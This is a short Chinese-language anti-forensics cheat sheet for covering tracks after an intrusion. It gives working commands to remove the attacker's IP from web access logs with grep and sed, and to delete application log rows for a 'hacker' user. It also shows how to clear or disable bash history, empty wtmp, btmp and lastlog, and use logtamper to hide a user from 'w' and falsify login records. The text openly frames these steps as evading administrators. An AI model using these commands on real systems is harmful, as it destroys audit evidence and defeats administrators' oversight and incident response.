# 日志清理

## web服务的访问日志

### 日志路径
1. 常用web服务器的默认日志路径
2. 自定义日志路径

### 清理日志
<pre>
1. 使用cat和grep命令清理
> cat access.log | grep yourip  //查找特定日志内容
> cat access.log | grep -v yourip > /tmp/a.log  //将需要留下的日志内容另存
> cat /tmp/a.log > access.log  //覆盖原有日志内容

2. 使用sed命令清理
//提取具体日志关键词, 构造正则表达式, 通过sed命令删除匹配的行
> sed -i -e '/192\.168\.1\.123/d' /var/log/messages
</pre>

## web应用日志清理
一些完善的web应用, 对于一些操作, 每一步都有记录
保存形式有文本文件和数据库存储

### 数据库日志记录清理
<pre>
// 一张日志表可能有user, ip, timestamp, action等字段
> DELETE FROM applogs WHERE user="hacker";
</pre>

## history命令日志的删除

<pre>
1. 使用-c选项, 不过这条命令本身会保存
> history -c
> history -w

2. 进入系统后, 先备份一下.bash_history, 撤退时还原

3. 禁用history
> unset HISTORY HISTFILE HISTSAVE HISTZONE HISTLOG
> export HISTFILE=/dev/null
> export HISTSIZE=0
> export HISTFILESIZE=0
</pre>

## linux登录日志的清扫

<pre>
1. 清除日志内所有内容
/var/log/dmesg  //包含核心启动日志
/var/log/messages  //系统报错日志
/var/log/boot系统引导日志
> echo > /var/log/wtmp  //清除系统登录成功记录
> echo > /var/log/btmp  //清除系统登录失败记录
> echo > /var/log/lastlog  //清除最近登录信息
2. 使用工具清除日志指定内容
wtmpclean
logtamper

> python logtamper.py -m 1 -u b4dboy -i 192.168.1.110  //躲避管理员w查看
> python logtamper.py -m 2 -u b4dboy -i 192.168.1.110  //清除指定的登录日志
> python logtamper.py -m 2 -f /var/log/btmp -u b4dboy -i 192.168.1.110  //清除指定的登录失败记录
> python logtamper.py -m 3 -u b4dboy -i 192.168.1.110 -t tty1 -d 2018:10:27:10:11:12  //修改上次登录时间地点
</pre>
